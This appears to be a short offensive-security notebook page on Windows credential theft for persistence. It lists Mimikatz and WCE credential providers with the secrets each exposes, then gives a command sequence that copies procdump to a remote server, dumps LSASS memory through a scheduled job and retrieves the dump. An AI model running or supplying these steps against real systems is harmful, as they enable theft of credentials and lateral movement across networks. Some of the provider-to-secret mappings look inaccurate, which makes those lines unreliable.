<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>General Primer</title>
</head><body>What better method for persistence than keylogging and reusing valid credentials? <br/>
Note: You have to be SYSTEM to get into winlogon for the user.<br/>
<br/>
<br/>
For dumping passwords, see Tools &gt; Password Related &gt; <a href="nbk:///53358664-7bb9-4d4a-84dd-7a53386e6306">Dumpers</a>&nbsp;or other various pages. Here are some quick references<br/>
WCE and Mimikatz<br/>
wdigest (your AD password)<br/>
kerberos (your LM / NTLM hash)<br/>
ssp (your Outlook password)<br/>
livessp (your windows 8 password)<br/>
msv (your AD password)<br/>
tspkg (your AD password)<br/>
<br/>
<br/>
If you can't do either of those, you can process dump and gather passwords from memory manually using procdump<br/>
net use \\targetserver \user:DOM\user pass<br/>
copy procdump.exe \\targetserver\c$<br/>
copy procdump.bat \\targetserver\c$<br/>
procdump.exe -ma lsass %CNAME%.dmp<br/>
at \\targetserver 13:37 C:\procdump.bat<br/>
copy \\targetserver\c$\targetserver.dmp</body></html>